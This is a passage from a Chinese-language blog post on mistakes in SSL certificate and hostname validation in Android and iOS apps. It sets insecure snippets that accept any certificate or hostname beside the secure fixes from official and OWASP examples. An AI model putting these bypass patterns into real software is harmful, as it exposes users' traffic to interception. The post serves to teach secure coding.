&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;本用來檢查伺服器憑證的 checkServerTrusted 被留空，導致警告被略過。Google 建議不要自行實作 TrustManager，而是把憑證放到 KeyStore，再把 KeyStore 放到 TrustManagerFactory，最後從 TrustManagerFactory 產出相關的 TrustManager，開發文件中有提供處理的&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html#UnknownCa&quot;&gt;範例&lt;/a&gt;。OWASP 的 WIKI 上也有提供自行實作 TrustManager 做 certificate pinning 的&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning#Android&quot;&gt;範例&lt;/a&gt;。&lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;下面節錄 Android 官方文件上的範例：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;KeyStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultAlgorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TLS&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTrustManagers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;android-錯誤處理情況3&quot;&gt;Android 錯誤處理情況3&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ALLOW_ALL_HOSTNAME_VERIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;或是&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;HostnameVerifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allHostVerifier&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;上述寫法略過了憑證中的 hostname 檢查，導致即使連線端與憑證中指定的 hostname 不一致也能通過。較為恰當的做法是不特別設定，讓他使用預設的 DefaultHostnameVerifier，或是採用更為嚴謹的 StrictHostnameVerifier。&lt;/p&gt;

&lt;h4 id=&quot;ios-錯誤處理情況1&quot;&gt;iOS 錯誤處理情況1&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;@implementation&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;NSURLRequest&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;IgnoreSSL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;allowsAnyHTTPSCertificateForHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;YES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;此情況使用到 Framework 中的 Private API，雖然這種寫法會因為不能通過 Apple 的審查而不會出現在 AppStore 上(使用回避技巧不在這討論範圍內)，但仍有機會在無需經過 Apple 審查的 Enterprise App 中使用。較為適當的做法是用 “#if DEBUG”，”#endif” 包起來以確保該段程式在編譯時只能對開發中的 debug 版上有作用。&lt;/p&gt;

&lt;h4 id=&quot;ios-錯誤處理情況2&quot;&gt;iOS 錯誤處理情況2&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;canAuthenticateAgainstProtectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;continueWithoutCredentialForAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;上面的做法會讓使用 NSURLConnection 的連線略過憑證檢查，容許任意憑證通過。下面節錄 OWASP WIKI 上的範例：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;autorelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UInt8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetBytePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
